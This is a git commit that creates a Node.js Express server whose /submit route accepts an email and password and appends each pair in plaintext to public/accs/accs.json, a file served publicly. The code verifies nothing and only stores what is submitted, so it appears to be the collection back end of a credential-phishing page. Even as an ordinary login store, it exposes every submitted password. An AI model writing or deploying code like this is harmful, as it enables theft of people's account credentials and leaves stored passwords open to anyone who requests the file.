79f0db6df96f441ac4358ae253540067e36106b7
yasssss30 <160343910+yasssss30@users.noreply.github.com>
2024-03-08 23:48:45 +0800

    Create index.js

---
+++ index.js
@@ -0,0 +1,27 @@
+const express = require('express');
+const app = express();
+const bodyParser = require('body-parser');
+const fs = require('fs');
+app.use(bodyParser.urlencoded({extended: true}));
+app.use(express.static('public'));
+app.post('/submit', (req, res) => {
+    const {email, password} = req.body;
+    if (!email || !password) {
+        res.status(400).send('invalid');
+    } else {
+        const data = {email, password};
+        fs.readFile('public/accs/accs.json', (e, content) => {
+            let array = [];
+            if (!e){
+                array = JSON.parse(content);
+            }
+            array.push(data);
+            fs.writeFileSync('public/accs/accs.json', JSON.stringify(array, null, 2));
+            res.send('success');
+        });
+    }
+});
+const port = 3725;
+app.listen(port, () => {
+    console.log('port', port);
+});
